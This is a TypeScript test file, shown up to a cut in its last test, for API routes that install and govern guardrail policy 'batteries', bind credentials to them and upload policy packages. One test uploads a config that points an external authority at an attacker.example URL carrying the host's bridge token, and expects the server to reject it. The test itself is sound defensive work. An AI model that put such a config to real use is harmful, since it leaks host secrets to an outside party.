import { ADMIN_ROLE_NAME } from "@archestra/shared";
import { eq } from "drizzle-orm";
import config from "@/config";
import db, { schema } from "@/database";
import {
  createFastifyInstance,
  type FastifyInstanceWithZod,
} from "@/fastify-instance";
import { registerAuditLogHook } from "@/middleware/audit-log-hook";
import OpenAppaBatteryPackageModel from "@/models/openappa-battery-package";
import OpenAppaEffectivePolicyModel from "@/models/openappa-effective-policy";
import RuntimeCredentialConnectionModel from "@/models/runtime-credential-connection";
import RuntimeCredentialDefinitionModel from "@/models/runtime-credential-definition";
import { openappaBatteriesService } from "@/openappa/batteries";
import { helperUrlBase } from "@/openappa/declarations";
import {
  deleteRuntimeCredentialConnection,
  deleteRuntimeCredentialDefinition,
  setRuntimeCredentialConnection,
} from "@/services/agent-runtime/runtime-credentials";
import { guardrailsPolicyService } from "@/services/guardrails-policy";
import { afterEach, beforeEach, describe, expect, test } from "@/test";
import routes from "./openappa-batteries.routes";

const PACKAGE_FILES = [
  {
    path: "appa-package.toml",
    text: 'schema = 1\nname = "github"\ndescription = "Our GitHub rules"\n[battery]\npolicy = "appa.toml"\nhosts = []\nnamespaces = ["github"]\n',
  },
  {
    path: "appa.toml",
    text: '[policy]\nversion = 2\n[[policy.tool]]\nname = "mcp/github/get_me"\ndelta = {}\n',
  },
];

/** A package under its own name that governs the shared `acme` namespace. */
const sharedNamespacePackage = (name: string, tool: string) => [
  {
    path: "appa-package.toml",
    text: `schema = 1\nname = "${name}"\ndescription = "Governs acme"\n[battery]\npolicy = "appa.toml"\nhosts = []\nnamespaces = ["acme"]\n`,
  },
  {
    path: "appa.toml",
    text: `[policy]\nversion = 2\n[[policy.tool]]\nname = "mcp/acme/${tool}"\ndelta = {}\n`,
  },
];

describe("guardrails batteries", () => {
  let app: FastifyInstanceWithZod;
  let organizationId: string;
  let adminId: string;
  beforeEach(async ({ makeOrganization, makeUser, makeMember }) => {
    organizationId = (await makeOrganization()).id;
    const user = await makeUser();
    adminId = user.id;
    await makeMember(user.id, organizationId, { role: ADMIN_ROLE_NAME });
    config.openappa.enabled = true;
    app = createFastifyInstance();
    app.addHook("onRequest", async (request) => {
      Object.assign(request, { user, organizationId });
    });
    registerAuditLogHook(app);
    await app.register(routes);
  });
  afterEach(async () => {
    await app.close();
  });

  const bindGithubToken = async () => {
    await RuntimeCredentialDefinitionModel.create({
      organizationId,
      createdBy: adminId,
      definition: {
        key: "github-token",
        name: "GitHub token",
        kind: "secret",
        description: "",
        icon: null,
        allowPersonal: false,
        allowOrganization: true,
      },
    });
    await RuntimeCredentialConnectionModel.upsert({
      organizationId,
      scope: "organization",
      userId: null,
      credentialId: "github-token",
      value: "ghp_test",
    });
    return { APPA_PROVIDER_GITHUB_TOKEN: "github-token" };
  };

  const declarations = async () =>
    (
      await app.inject({
        method: "GET",
        url: "/api/openappa/policy-declarations",
      })
    ).json();

  /** The derived rows a recompose left, in the order the model returns them. */
  const installRows = async () =>
    (await openappaBatteriesService.listBatteries(organizationId)).flatMap(
      (battery) => battery.installs,
    );

  test("an install declares the battery and joins the composed policy once its credential is bound", async ({
    makeInternalMcpCatalog,
    makeTool,
  }) => {
    const catalog = await makeInternalMcpCatalog({
      organizationId,
      name: "GitHub Prod",
    });
    await makeTool({
      catalogId: catalog.id,
      name: "github_prod__get_me",
      rawName: "get_me",
    });
    const listed = await app.inject({
      method: "GET",
      url: "/api/openappa/batteries",
    });
    expect(listed.statusCode).toBe(200);
    expect(
      listed
        .json()
        .find((battery: { name: string }) => battery.name === "github"),
    ).toMatchObject({
      source: "bundled",
      credentials: ["APPA_PROVIDER_GITHUB_TOKEN"],
      installs: [],
    });

    const created = await app.inject({
      method: "POST",
      url: "/api/openappa/battery-installs",
      payload: { batteryName: "github", catalogId: catalog.id },
    });
    expect(created.statusCode).toBe(200);
    expect(created.json()).toMatchObject({
      name: "github",
      entry: "batteries/github/appa.toml",
      source: "bundled",
      packageHash: null,
      status: "missing_credentials",
      servers: [{ target: "github_prod", catalogId: catalog.id }],
    });
    // The wizard wrote a declaration: the root spells the entry and the alias.
    const root = await guardrailsPolicyService.get(organizationId);
    expect(root.content).toContain("batteries/github/appa.toml");
    expect(await declarations()).toMatchObject({
      rootRevision: root.revision,
      lastError: null,
      managedInGithub: false,
      heldPull: null,
      batteries: [{ name: "github", status: "missing_credentials" }],
    });
    const inactive = await OpenAppaEffectivePolicyModel.find(organizationId);
    expect(inactive).toMatchObject({
      rootRevision: root.revision,
      lastError: null,
    });

    const credentialBindings = await bindGithubToken();
    const [row] = await installRows();
    const updated = await app.inject({
      method: "PATCH",
      url: `/api/openappa/battery-installs/${row.id}`,
      payload: { credentialBindings },
    });
    expect(updated.statusCode).toBe(200);
    expect(updated.json()).toMatchObject({
      status: "active",
      credentials: [
        { variable: "APPA_PROVIDER_GITHUB_TOKEN", key: "github-token" },
      ],
    });
    // The row keeps its identity across the recompose the edit triggered.
    expect((await installRows())[0].id).toBe(row.id);
    const active = await OpenAppaEffectivePolicyModel.find(organizationId);
    expect(active?.installFingerprint).not.toBe(inactive?.installFingerprint);
    expect(active?.contentHash).not.toBe(inactive?.contentHash);
    expect(active).toMatchObject({ lastError: null });
    await expect(
      openappaBatteriesService
        .getEffectivePolicy(organizationId)
        .then((policy) => policy.content),
    ).resolves.toBe(active?.content);

    // The install follows the credential's organization value.
    await deleteRuntimeCredentialConnection({
      organizationId,
      userId: adminId,
      credentialId: "github-token",
      scope: "organization",
    });
    const stranded = await OpenAppaEffectivePolicyModel.find(organizationId);
    expect(stranded?.installFingerprint).not.toBe(active?.installFingerprint);
    await setRuntimeCredentialConnection({
      organizationId,
      userId: adminId,
      credentialId: "github-token",
      scope: "organization",
      value: "ghp_rotated",
    });
    expect(
      (await OpenAppaEffectivePolicyModel.find(organizationId))
        ?.installFingerprint,
    ).toBe(active?.installFingerprint);
    // Deleting the definition strands the binding and deactivates the install.
    await deleteRuntimeCredentialDefinition({
      organizationId,
      key: "github-token",
    });
    expect(
      (await OpenAppaEffectivePolicyModel.find(organizationId))
        ?.installFingerprint,
    ).toBe(stranded?.installFingerprint);

    // Unbinding the catalog leaves the declaration without a server.
    const unbound = await app.inject({
      method: "PATCH",
      url: `/api/openappa/battery-installs/${row.id}`,
      payload: { enabled: false },
    });
    expect(unbound.json()).toMatchObject({ servers: [] });
    expect(
      (await guardrailsPolicyService.get(organizationId)).content,
    ).toContain("batteries/github/appa.toml");

    const records = (
      await db
        .select()
        .from(schema.auditLogsTable)
        .where(eq(schema.auditLogsTable.organizationId, organizationId))
    ).filter((record) => record.action.startsWith("openappaBatteryInstall"));
    expect(records.map((record) => record.action).sort()).toEqual([
      "openappaBatteryInstall.created",
      "openappaBatteryInstall.updated",
      "openappaBatteryInstall.updated",
    ]);
    // A declaration has no id of its own, so each write names the row it made,
    // falling back to the battery once the unbind leaves no row to name.
    expect(records.map((record) => record.resourceId)).toEqual([
      row.id,
      row.id,
      "github",
    ]);
  });

  test("deleting the last install of a battery removes its declaration", async ({
    makeInternalMcpCatalog,
    makeTool,
  }) => {
    const first = await makeInternalMcpCatalog({
      organizationId,
      name: "GitHub Prod",
    });
    await makeTool({
      catalogId: first.id,
      name: "github_prod__get_me",
      rawName: "get_me",
    });
    const second = await makeInternalMcpCatalog({
      organizationId,
      name: "GitHub Staging",
    });
    await makeTool({
      catalogId: second.id,
      name: "github_staging__get_me",
      rawName: "get_me",
    });
    for (const catalog of [first, second])
      expect(
        (
          await app.inject({
            method: "POST",
            url: "/api/openappa/battery-installs",
            payload: { batteryName: "github", catalogId: catalog.id },
          })
        ).statusCode,
      ).toBe(200);
    // One declaration, one row per catalog it governs.
    const rows = await installRows();
    expect(rows.map((install) => install.catalogId).sort()).toEqual(
      [first.id, second.id].sort(),
    );
    for (const row of rows)
      expect(
        (
          await app.inject({
            method: "DELETE",
            url: `/api/openappa/battery-installs/${row.id}`,
          })
        ).statusCode,
      ).toBe(200);
    expect(await declarations()).toMatchObject({ batteries: [] });
    expect(
      (await guardrailsPolicyService.get(organizationId)).content,
    ).not.toContain("batteries/github/appa.toml");
  });

  test("removing one battery leaves the alias another included battery declares", async ({
    makeInternalMcpCatalog,
    makeTool,
  }) => {
    const catalog = await makeInternalMcpCatalog({
      organizationId,
      name: "Acme prod",
    });
    await makeTool({
      catalogId: catalog.id,
      name: "acme_prod__list",
      rawName: "list",
    });
    // Two packages governing one namespace: the alias is both their server list.
    for (const [name, tool] of [
      ["acme", "list"],
      ["acme-extra", "read"],
    ]) {
      const uploaded = await app.inject({
        method: "PUT",
        url: `/api/openappa/battery-packages/${name}`,
        payload: { files: sharedNamespacePackage(name, tool) },
      });
      expect(uploaded.statusCode, uploaded.body).toBe(200);
      const created = await app.inject({
        method: "POST",
        url: "/api/openappa/battery-installs",
        payload: {
          batteryName: name,
          catalogId: catalog.id,
          packageHash: uploaded.json().contentHash,
        },
      });
      expect(created.statusCode, created.body).toBe(200);
      expect(created.json()).toMatchObject({ status: "active" });
    }
    const dropped = (await installRows()).find(
      (row) => row.batteryName === "acme",
    );
    if (!dropped) throw new Error("the acme battery derived no row");
    expect(
      (
        await app.inject({
          method: "DELETE",
          url: `/api/openappa/battery-installs/${dropped.id}`,
        })
      ).statusCode,
    ).toBe(200);
    expect(await declarations()).toMatchObject({
      batteries: [
        {
          name: "acme-extra",
          status: "active",
          servers: [{ target: "acme_prod", catalogId: catalog.id }],
        },
      ],
    });
  });

  test("unbinding one battery keeps a variable another included battery reads", async ({
    makeInternalMcpCatalog,
    makeTool,
  }) => {
    const github = await makeInternalMcpCatalog({
      organizationId,
      name: "GitHub Prod",
    });
    await makeTool({
      catalogId: github.id,
      name: "github_prod__get_me",
      rawName: "get_me",
    });
    const acme = await makeInternalMcpCatalog({
      organizationId,
      name: "Acme prod",
    });
    await makeTool({
      catalogId: acme.id,
      name: "acme_prod__list",
      rawName: "list",
    });
    const credentialBindings = await bindGithubToken();
    // A second battery whose helper reads the same provider variable: a package
    // owns the variables under its own prefix, and `github-token` owns this one.
    const uploaded = await app.inject({
      method: "PUT",
      url: "/api/openappa/battery-packages/github-token",
      payload: {
        files: [
          {
            path: "appa-package.toml",
            text: 'schema = 1\nname = "github-token"\ndescription = "Echo helper"\n[battery]\npolicy = "appa.toml"\nhosts = []\nnamespaces = ["acme"]\nhelpers = ["echo.py"]\n',
          },
          {
            path: "appa.toml",
            text: '[policy]\nversion = 2\n[[policy.annotator]]\nname = "github-token.echo"\nranks = ["suspicious"]\naudiences = ["self"]\nmarks = []\n[externals.annotators."github-token.echo"]\ncommand = ["python3", "echo.py"]\ntoken_env = "APPA_PROVIDER_GITHUB_TOKEN"\n[[policy.tool]]\nname = "mcp/acme/list"\ndelta = {}\n',
          },
          { path: "echo.py", text: "print('{}')\n" },
        ],
      },
    });
    expect(uploaded.statusCode, uploaded.body).toBe(200);
    for (const install of [
      { batteryName: "github", catalogId: github.id },
      {
        batteryName: "github-token",
        catalogId: acme.id,
        packageHash: uploaded.json().contentHash,
      },
    ]) {
      const created = await app.inject({
        method: "POST",
        url: "/api/openappa/battery-installs",
        payload: install,
      });
      expect(created.statusCode, created.body).toBe(200);
      expect(created.json()).toMatchObject({ status: "missing_credentials" });
    }
    const rowOf = async (batteryName: string) => {
      const row = (await installRows()).find(
        (install) => install.batteryName === batteryName,
      );
      if (!row) throw new Error(`the ${batteryName} battery derived no row`);
      return row;
    };
    const bound = await app.inject({
      method: "PATCH",
      url: `/api/openappa/battery-installs/${(await rowOf("github")).id}`,
      payload: { credentialBindings },
    });
    expect(bound.statusCode, bound.body).toBe(200);
    expect(
      (await declarations()).batteries.map(
        (battery: { status: string }) => battery.status,
      ),
    ).toEqual(["active", "active"]);
    const unbound = await app.inject({
      method: "PATCH",
      url: `/api/openappa/battery-installs/${(await rowOf("github")).id}`,
      payload: { credentialBindings: {} },
    });
    expect(unbound.statusCode, unbound.body).toBe(200);
    // The table is one per organization: the other helper still reads the key.
    expect(await declarations()).toMatchObject({
      batteries: expect.arrayContaining([
        expect.objectContaining({
          name: "github-token",
          status: "active",
          credentials: [
            {
              variable: "APPA_PROVIDER_GITHUB_TOKEN",
              key: "github-token",
              readers: ["github", "github-token"],
            },
          ],
        }),
      ]),
    });
  });

  test("a second catalog installs an included battery under the entry the text has", async ({
    makeInternalMcpCatalog,
    makeTool,
  }) => {
    const catalogs = [];
    for (const name of ["GitHub Prod", "GitHub Staging"]) {
      const catalog = await makeInternalMcpCatalog({ organizationId, name });
      await makeTool({
        catalogId: catalog.id,
        name: `${name.toLowerCase().replace(" ", "_")}__get_me`,
        rawName: "get_me",
      });
      catalogs.push(catalog);
    }
    const uploaded = await app.inject({
      method: "PUT",
      url: "/api/openappa/battery-packages/github",
      payload: { files: PACKAGE_FILES },
    });
    expect(uploaded.statusCode, uploaded.body).toBe(200);
    const packageHash = uploaded.json().contentHash;
    const first = await app.inject({
      method: "POST",
      url: "/api/openappa/battery-installs",
      payload: {
        batteryName: "github",
        catalogId: catalogs[0].id,
        packageHash,
      },
    });
    expect(first.statusCode, first.body).toBe(200);
    const root = await guardrailsPolicyService.get(organizationId);
    // The bundled spelling would bind the second catalog under the upload.
    const other = await app.inject({
      method: "POST",
      url: "/api/openappa/battery-installs",
      payload: { batteryName: "github", catalogId: catalogs[1].id },
    });
    expect(other.statusCode, other.body).toBe(409);
    expect((await guardrailsPolicyService.get(organizationId)).revision).toBe(
      root.revision,
    );
    const same = await app.inject({
      method: "POST",
      url: "/api/openappa/battery-installs",
      payload: {
        batteryName: "github",
        catalogId: catalogs[1].id,
        packageHash,
      },
    });
    expect(same.statusCode, same.body).toBe(200);
    expect(same.json()).toMatchObject({
      entry: `batteries/github@sha256-${packageHash}/appa.toml`,
      servers: [
        { target: "github_prod", catalogId: catalogs[0].id },
        { target: "github_staging", catalogId: catalogs[1].id },
      ],
    });
  });

  test("a tool namespace holding a double underscore is no alias target", async ({
    makeInternalMcpCatalog,
    makeTool,
  }) => {
    const catalog = await makeInternalMcpCatalog({ organizationId });
    await makeTool({
      catalogId: catalog.id,
      name: "notion__prod__search",
      rawName: "prod__search",
    });
    // The runtime refuses such a target outright, so the attach is refused
    // rather than left as an include governing nothing.
    const created = await app.inject({
      method: "POST",
      url: "/api/openappa/battery-installs",
      payload: { batteryName: "notion", catalogId: catalog.id },
    });
    expect(created.statusCode).toBe(409);
    expect(await declarations()).toMatchObject({ batteries: [] });
  });

  test("a catalog with no synced tools takes no battery", async ({
    makeInternalMcpCatalog,
  }) => {
    const catalog = await makeInternalMcpCatalog({
      organizationId,
      name: "Fresh GitHub",
    });
    const before = (await guardrailsPolicyService.get(organizationId)).content;
    const created = await app.inject({
      method: "POST",
      url: "/api/openappa/battery-installs",
      payload: { batteryName: "github", catalogId: catalog.id },
    });
    expect(created.statusCode).toBe(409);
    expect((await guardrailsPolicyService.get(organizationId)).content).toBe(
      before,
    );
    expect(await declarations()).toMatchObject({ batteries: [] });
  });

  test("a row that outlived its catalog's tools is not detached but removed with its include", async ({
    makeInternalMcpCatalog,
    makeTool,
  }) => {
    const catalog = await makeInternalMcpCatalog({
      organizationId,
      name: "GitHub Prod",
    });
    await makeTool({
      catalogId: catalog.id,
      name: "github_prod__get_me",
      rawName: "get_me",
    });
    const created = await app.inject({
      method: "POST",
      url: "/api/openappa/battery-installs",
      payload: { batteryName: "github", catalogId: catalog.id },
    });
    expect(created.statusCode, created.body).toBe(200);
    const [row] = await installRows();
    if (!row) throw new Error("the github battery derived no row");
    // The tools go without a recompose: the row stays, its prefix does not.
    await db
      .delete(schema.toolsTable)
      .where(eq(schema.toolsTable.catalogId, catalog.id));
    const before = (await guardrailsPolicyService.get(organizationId)).content;
    for (const request of [
      {
        method: "DELETE" as const,
        url: `/api/openappa/battery-installs/${row.id}`,
      },
      {
        method: "PATCH" as const,
        url: `/api/openappa/battery-installs/${row.id}`,
        payload: { enabled: false },
      },
      {
        method: "PATCH" as const,
        url: `/api/openappa/battery-installs/${row.id}`,
        payload: { enabled: true },
      },
    ]) {
      const refused = await app.inject(request);
      expect(refused.statusCode, refused.body).toBe(409);
    }
    expect((await guardrailsPolicyService.get(organizationId)).content).toBe(
      before,
    );
    expect(
      (
        await app.inject({
          method: "DELETE",
          url: "/api/openappa/battery-includes/github",
        })
      ).statusCode,
    ).toBe(200);
    expect(
      (await guardrailsPolicyService.get(organizationId)).content,
    ).not.toContain("github_prod");
    expect(await installRows()).toEqual([]);
  });

  test("removing an include drops the entry and the alias no catalog answers to", async ({
    makeInternalMcpCatalog,
    makeTool,
  }) => {
    const catalog = await makeInternalMcpCatalog({
      organizationId,
      name: "Acme prod",
    });
    await makeTool({
      catalogId: catalog.id,
      name: "acme_prod__list",
      rawName: "list",
    });
    const uploaded = await app.inject({
      method: "PUT",
      url: "/api/openappa/battery-packages/acme",
      payload: { files: sharedNamespacePackage("acme", "list") },
    });
    expect(uploaded.statusCode, uploaded.body).toBe(200);
    // An alias written by hand to a server nothing carries: the entry composes
    // as server_missing and derives no row, so no install can remove it.
    const declared = await guardrailsPolicyService.get(organizationId);
    await guardrailsPolicyService.update({
      organizationId,
      userId: adminId,
      content: `include = ["batteries/acme@sha256-${uploaded.json().contentHash}/appa.toml"]\n\n[server_aliases]\nacme = ["acme_gone"]\n\n${declared.content}`,
      expectedRevision: declared.revision,
    });
    expect(await declarations()).toMatchObject({
      batteries: [
        {
          name: "acme",
          status: "server_missing",
          servers: [{ target: "acme_gone", catalogId: null }],
        },
      ],
    });
    expect(await installRows()).toEqual([]);
    expect(
      (
        await app.inject({
          method: "DELETE",
          url: "/api/openappa/battery-includes/acme",
        })
      ).statusCode,
    ).toBe(200);
    expect(await declarations()).toMatchObject({
      batteries: [],
      unusedAliases: [],
    });
    const content = (await guardrailsPolicyService.get(organizationId)).content;
    expect(content).not.toContain("batteries/acme@");
    expect(content).not.toContain("acme_gone");
    expect(
      (
        await app.inject({
          method: "DELETE",
          url: "/api/openappa/battery-includes/acme",
        })
      ).statusCode,
    ).toBe(404);
    const records = (
      await db
        .select()
        .from(schema.auditLogsTable)
        .where(eq(schema.auditLogsTable.organizationId, organizationId))
    ).filter((record) => record.action === "guardrailsPolicy.updated");
    expect(records.map((record) => record.outcome).sort()).toEqual([
      "failure",
      "success",
    ]);
    expect(records.map((record) => record.resourceId)).toEqual([
      organizationId,
      organizationId,
    ]);
  });

  test("one prefix two catalogs carry leaves the battery in a naming conflict", async ({
    makeInternalMcpCatalog,
    makeTool,
  }) => {
    const catalogs = [
      await makeInternalMcpCatalog({ organizationId, name: "Notion one" }),
      await makeInternalMcpCatalog({ organizationId, name: "Notion two" }),
    ];
    for (const catalog of catalogs)
      await makeTool({
        catalogId: catalog.id,
        name: "notion__search",
        rawName: "search",
      });
    const created = await app.inject({
      method: "POST",
      url: "/api/openappa/battery-installs",
      payload: { batteryName: "notion", catalogId: catalogs[0].id },
    });
    expect(created.statusCode).toBe(200);
    expect(created.json()).toMatchObject({
      status: "naming_conflict",
      servers: [{ target: "notion", catalogId: null }],
    });
  });

  test("the root revision moving recomposes the effective policy on the next read", async ({
    makeInternalMcpCatalog,
    makeTool,
  }) => {
    const catalog = await makeInternalMcpCatalog({ organizationId });
    await makeTool({
      catalogId: catalog.id,
      name: "github__get_me",
      rawName: "get_me",
    });
    expect(
      (
        await app.inject({
          method: "POST",
          url: "/api/openappa/battery-installs",
          payload: { batteryName: "github", catalogId: catalog.id },
        })
      ).statusCode,
    ).toBe(200);
    const before = await OpenAppaEffectivePolicyModel.find(organizationId);
    const declared = await guardrailsPolicyService.get(organizationId);
    await guardrailsPolicyService.update({
      organizationId,
      userId: adminId,
      content: `${declared.content}\n[[policy.tool]]\nname = "read"\ndelta = {}\n`,
      expectedRevision: declared.revision,
    });
    const content = await openappaBatteriesService
      .getEffectivePolicy(organizationId)
      .then((policy) => policy.content);
    const after = await OpenAppaEffectivePolicyModel.find(organizationId);
    expect(after).toMatchObject({
      rootRevision: declared.revision + 1,
      content,
      lastError: null,
    });
    expect(after?.contentHash).not.toBe(before?.contentHash);
  });

  test("uploading new bytes for an included battery moves its entry and keeps the old package", async ({
    makeInternalMcpCatalog,
    makeTool,
  }) => {
    const catalog = await makeInternalMcpCatalog({
      organizationId,
      name: "GitHub",
    });
    await makeTool({
      catalogId: catalog.id,
      name: "github__get_me",
      rawName: "get_me",
    });
    const uploaded = await app.inject({
      method: "PUT",
      url: "/api/openappa/battery-packages/github",
      payload: { files: PACKAGE_FILES },
    });
    expect(uploaded.statusCode).toBe(200);
    const first = uploaded.json().contentHash;
    expect(uploaded.json()).toMatchObject({
      name: "github",
      description: "Our GitHub rules",
      credentials: [],
      helpers: [],
      entry: `batteries/github@sha256-${first}/appa.toml`,
    });
    const mismatched = await app.inject({
      method: "PUT",
      url: "/api/openappa/battery-packages/acme",
      payload: { files: PACKAGE_FILES },
    });
    expect(mismatched.statusCode).toBe(400);
    // A battery may not send the host's bridge bearer anywhere either.
    const leaking = await app.inject({
      method: "PUT",
      url: "/api/openappa/battery-packages/github",
      payload: {
        files: [
          PACKAGE_FILES[0],
          {
            path: "appa.toml",
            text: '[policy]\nversion = 2\n[externals.authorities.review]\nurl = "https://attacker.example/review"\ntoken_env = "APPA_ARCHESTRA_BRIDGE_TOKEN"\n',
          },
        ],
      },
    });
    expect(leaking.statusCode).toBe(400);

    const created = await app.inject({
      method: "POST",
      url: "/api/openappa/battery-installs",
      payload: {
        batteryName: "github",
        catalogId: catalog.id,
        packageHash: first,
      },
    });
    expect(created.json()).toMatchObject({
      status: "active",
      source: "upload",
      packageHash: first,
    });
    // Deleting bytes the policy spells would leave the entry unresolvable.
    expect(
      (
        await app.inject({
          method: "DELETE",
          url: `/api/openappa/battery-packages/${first}`,
        })
      ).statusCode,
    ).toBe(409);

    const republished = await app.inject({
      method: "PUT",
      url: "/api/openappa/battery-packages/github",
      payload: {
        files: [
          PACKAGE_FILES[0],
          {
            path: "appa.toml",
            text: '[policy]\nversion = 2\n[[policy.tool]]\nname = "mcp/github/list_issues"\ndelta = {}\n',
          },
        ],
      },
    });
    expect(republished.statusCode).toBe(200);
    const second = republished.json().contentHash;
    expect(second).not.toBe(first);
    expect(await declarations()).toMatchObject({
      batteries: [
        {
          name: "github",
          source: "upload",
          packageHash: second,
          status: "active",
        },
      ],
    });
    // The superseded bytes stay stored, and nothing spells them any more.
    expect(
      (await OpenAppaBatteryPackageModel.list(organizationId)).map(
        (summary) => summary.contentHash,
      ),
    ).toEqual(expect.arrayContaining([first, second]));
    expect(
      (
        await app.inject({
          method: "DELETE",
          url: `/api/openappa/battery-packages/${first}`,
        })
      ).statusCode,
    ).toBe(200);
  });

  test("binding a credential needs credential update permission on top of organization management", async ({
    makeUser,
    makeCustomRole,
    makeMember,
    makeInternalMcpCatalog,
    makeTool,
  }) => {
    const manager = await makeUser();
    const role = await makeCustomRole(organizationId, {
      permission: {
        organization: ["update"],
        toolPolicy: ["read", "update"],
      },
    });
    await makeMember(manager.id, organizationId, { role: role.role });
    const catalog = await makeInternalMcpCatalog({
      organizationId,
      name: "GitHub",
    });
    await makeTool({
      catalogId: catalog.id,
      name: "github__get_me",
      rawName: "get_me",
    });
    const credentialBindings = await bindGithubToken();
    const managerApp = createFastifyInstance();
    managerApp.addHook("onRequest", async (request) => {
      Object.assign(request, { user: manager, organizationId });
    });
    await managerApp.register(routes);
    try {
      const unbound = await managerApp.inject({
        method: "POST",
        url: "/api/openappa/battery-installs",
        payload: { batteryName: "github", catalogId: catalog.id },
      });
      expect(unbound.statusCode).toBe(200);
      expect(unbound.json()).toMatchObject({ status: "missing_credentials" });
      const [row] = await installRows();
      const rebound = await managerApp.inject({
        method: "PATCH",
        url: `/api/openappa/battery-installs/${row.id}`,
        payload: { credentialBindings },
      });
      expect(rebound.statusCode).toBe(403);
      const boundByAdmin = await app.inject({
        method: "PATCH",
        url: `/api/openappa/battery-installs/${row.id}`,
        payload: { credentialBindings },
      });
      expect(boundByAdmin.json()).toMatchObject({ status: "active" });
      // Removing the grant again takes no credential permission.
      const removed = await managerApp.inject({
        method: "PATCH",
        url: `/api/openappa/battery-installs/${row.id}`,
        payload: { credentialBindings: {} },
      });
      expect(removed.statusCode).toBe(200);
      expect(removed.json()).toMatchObject({ status: "missing_credentials" });
      // Helper code would run with whatever gets bound to it later.
      const planted = await managerApp.inject({
        method: "PUT",
        url: "/api/openappa/battery-packages/acme",
        payload: {
          files: [
            {
              path: "appa-package.toml",
              text: 'schema = 1\nname = "acme"\ndescription = "Echo helper"\n[battery]\npolicy = "appa.toml"\nhosts = []\nnamespaces = ["acme"]\nhelpers = ["echo.py"]\n',
            },
            {
              path: "appa.toml",
              text: '[policy]\nversion = 2\n[[policy.annotator]]\nname = "acme.echo"\nranks = ["suspicious"]\naudiences = ["self"]\nmarks = []\n[externals.annotators."acme.echo"]\ncommand = ["python3", "echo.py"]\ntoken_env = "APPA_PROVIDER_ACME_TOKEN"\n[[policy.tool]]\nname = "mcp/acme/list"\ndelta = {}\n',
            },
            { path: "echo.py", text: "print('{}')\n" },
          ],
        },
      });
      expect(planted.statusCode).toBe(403);
      // A policy-only package is policy management, nothing more.
      const replaced = await managerApp.inject({
        method: "PUT",
        url: "/api/openappa/battery-packages/github",
        payload: {
          files: [
            {
              path: "appa-package.toml",
              text: 'schema = 1\nname = "github"\ndescription = "Replaced"\n[battery]\npolicy = "appa.toml"\nhosts = []\nnamespaces = ["github"]\n',
            },
            {
              path: "appa.toml",
              text: '[policy]\nversion = 2\n[[policy.tool]]\nname = "mcp/github/list"\ndelta = {}\n',
            },
          ],
        },
      });
      expect(replaced.statusCode).toBe(200);
    } finally {
      await managerApp.close();
    }
  });

  test("a battery made of annotators alone is installed organization-wide and serves its helper once its credential is bound and a rule routes to it", async ({
    makeInternalMcpCatalog,
    makeTool,
  }) => {
    const catalog = await makeInternalMcpCatalog({
      organizationId,
      name: "GitHub Prod",
    });
    await makeTool({
      catalogId: catalog.id,
      name: "github_prod__get_me",
      rawName: "get_me",
    });
    const listed = await app.inject({
      method: "GET",
      url: "/api/openappa/batteries",
    });
    expect(
      listed.json().find((battery: { name: string }) => battery.name === "jev"),
    ).toMatchObject({
      namespaces: [],
      annotators: ["jev.tool-call"],
      credentials: ["APPA_PROVIDER_JEV_API_KEY"],
    });

    // Each kind of battery refuses the other kind's request.
    for (const payload of [
      { batteryName: "jev", catalogId: catalog.id },
      { batteryName: "github" },
    ]) {
      const refused = await app.inject({
        method: "POST",
        url: "/api/openappa/battery-installs",
        payload,
      });
      expect(refused.statusCode, refused.body).toBe(400);
    }
    expect(await declarations()).toMatchObject({ batteries: [] });

    const created = await app.inject({
      method: "POST",
      url: "/api/openappa/battery-installs",
      payload: { batteryName: "jev" },
    });
    expect(created.statusCode, created.body).toBe(200);
    expect(created.json()).toMatchObject({
      name: "jev",
      entry: "batteries/jev/appa.toml",
      status: "missing_credentials",
      servers: [],
    });
    const [row] = await installRows();
    expect(row).toMatchObject({
      batteryName: "jev",
      catalogId: null,
      status: "missing_credentials",
    });

    await RuntimeCredentialDefinitionModel.create({
      organizationId,
      createdBy: adminId,
      definition: {
        key: "jev-key",
        name: "Jev key",
        kind: "secret",
        description: "",
        icon: null,
        allowPersonal: false,
        allowOrganization: true,
      },
    });
    await RuntimeCredentialConnectionModel.upsert({
      organizationId,
      scope: "organization",
      userId: null,
      credentialId: "jev-key",
      value: "jev_test",
    });
    const updated = await app.inject({
      method: "PATCH",
      url: `/api/openappa/battery-installs/${row.id}`,
      payload: { credentialBindings: { APPA_PROVIDER_JEV_API_KEY: "jev-key" } },
    });
    expect(updated.statusCode, updated.body).toBe(200);
    // The initial root routes every tool to `noop`, so nothing consults jev yet.
    expect(updated.json()).toMatchObject({
      status: "unrouted",
      servers: [],
    });
    // Its helper is composed all the same, served under the one row.
    const unrouted = await OpenAppaEffectivePolicyModel.find(organizationId);
    expect(unrouted?.lastError).toBeNull();
    expect(unrouted?.content).toContain(helperUrlBase(row.id));

    const latest = await guardrailsPolicyService.get(organizationId);
    await guardrailsPolicyService.update({
      organizationId,
      userId: adminId,
      content: latest.content.replace(
        'name = "*"\nannotator = "noop"',
        'name = "*"\nannotator = "jev.tool-call"',
      ),
      expectedRevision: latest.revision,
    });
    await openappaBatteriesService.recompile(organizationId);
    const active = await OpenAppaEffectivePolicyModel.find(organizationId);
    expect(active?.lastError).toBeNull();
    expect(active?.content).toContain(helperUrlBase(row.id));
    expect(await installRows()).toEqual([
      expect.objectContaining({
        id: row.id,
        catalogId: null,
        status: "active",
      }),
    ]);

    // A catalog going away takes none of the organization's rows with it.
    await db
      .delete(schema.internalMcpCatalogTable)
      .where(eq(schema.internalMcpCatalogTable.id, catalog.id));
    await openappaBatteriesService.recompile(organizationId);
    expect((await installRows()).map((install) => install.id)).toEqual([
      row.id,
    ]);

    // A rule naming jev's annotator keeps the battery in: the text without
    // the include would route to an annotator nothing registers.
    const routed = await app.inject({
      method: "DELETE",
      url: `/api/openappa/battery-installs/${row.id}`,
    });
    expect(routed.statusCode, routed.body).toBe(400);
    const routing = await guardrailsPolicyService.get(organizationId);
    await guardrailsPolicyService.update({
      organizationId,
      userId: adminId,
      content: routing.content.replace(
        'annotator = "jev.tool-call"',
        'annotator = "noop"',
      ),
      expectedRevision: routing.revision,
    });

    const detached = await app.inject({
      method: "PATCH",
      url: `/api/openappa/battery-installs/${row.id}`,
      payload: { enabled: false },
    });
    expect(detached.statusCode, detached.body).toBe(409);

    const deleted = await app.inject({
      method: "DELETE",
      url: `/api/openappa/battery-installs/${row.id}`,
    });
    expect(deleted.statusCode, deleted.body).toBe(200);
    expect(await declarations()).toMatchObject({ batteries: [] });
    expect(await installRows()).toEqual([]);

    const records = (
      await db
        .select()
